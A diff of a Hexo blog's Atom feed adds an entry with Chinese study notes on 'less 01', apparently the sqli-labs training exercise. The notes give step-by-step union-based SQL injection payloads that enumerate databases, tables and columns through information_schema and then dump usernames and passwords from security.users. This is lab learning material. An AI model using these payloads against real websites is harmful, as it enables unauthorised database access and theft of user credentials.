@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2022-02-25T13:10:56.040Z</updated>
+  <updated>2022-02-25T13:45:52.130Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>1</title>
+    <link href="http://example.com/2022/01/28/01/"/>
+    <id>http://example.com/2022/01/28/01/</id>
+    <published>2022-01-28T13:19:38.000Z</published>
+    <updated>2022-02-25T13:45:52.130Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="less-01的学习"><a href="#less-01的学习" class="headerlink" title="less 01的学习"></a>less 01的学习</h2><p>less 1</p><p>1.先输入?id=1，发现回显正常。</p><p>再输入?id=1’,发现系统进行报错，且发现错因是引号，所以位字符型注入。</p><p>2.输入order by语句对题目的列数进行猜测（这里我们用到二分法进行判断）</p><p>可知列数为3.————?id=1’ order by 3–+ </p><p>3.用id=-1；来使数据库进行报错，并加入union select 1,2,3, –+语句进行顶替</p><p>————?id=-1’ union select 1,2,3–+</p><p>使显示位显示的数据为username：2，password：3。</p><p>4.选择username或password的位置进行显示我们要查询的数据。</p><p>用语句————?id=-1’ union select 1,2,group_concat(schema_name)from information_schema.schemata–+</p><p>查询显示出好几个库名 选择security作为查询对象。</p><p>或者用语句————?id=-1’ union select 1,2,database()–+进行查询，结果为security</p><p>5.查询表中数据</p><p>?id=-1’ union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=’security’ –+</p><p>6.查询列中的数据</p><p>?id=-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’users’–+</p><p>7.查询username和password数据?id=-1’ union select 1,2,group_concat(concat_ws(‘~’,username,password)) from security.users–+</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;less-01的学习&quot;&gt;&lt;a href=&quot;#less-01的学习&quot; class=&quot;headerlink&quot; title=&quot;less 01的学习&quot;&gt;&lt;/a&gt;less 01的学习&lt;/h2&gt;&lt;p&gt;less 1&lt;/p&gt;
+&lt;p&gt;1.先输入?id=1，发现回显正常。&lt;/p&gt;
+&lt;</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>sql函数与使用</title>
